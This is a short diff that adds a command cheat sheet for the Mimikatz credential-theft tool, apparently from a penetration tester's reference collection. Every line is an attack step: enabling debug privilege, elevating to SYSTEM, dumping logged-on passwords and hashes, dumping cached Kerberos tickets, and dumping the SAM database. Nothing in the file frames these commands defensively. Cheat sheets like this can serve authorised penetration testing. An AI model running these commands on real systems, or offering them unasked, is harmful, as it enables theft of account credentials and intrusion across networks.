@@ -1,0 +1,16 @@
+% mimikatz
+
+# Enter privilege debug
+privilege::debug
+
+# Elevate to system
+token::elevate
+
+# Dump logged in hashes
+sekurlsa::logonpasswords
+
+# Dump cached tickets
+sekurlsa::tickets
+
+# Dump SAM
+lsadump::sam
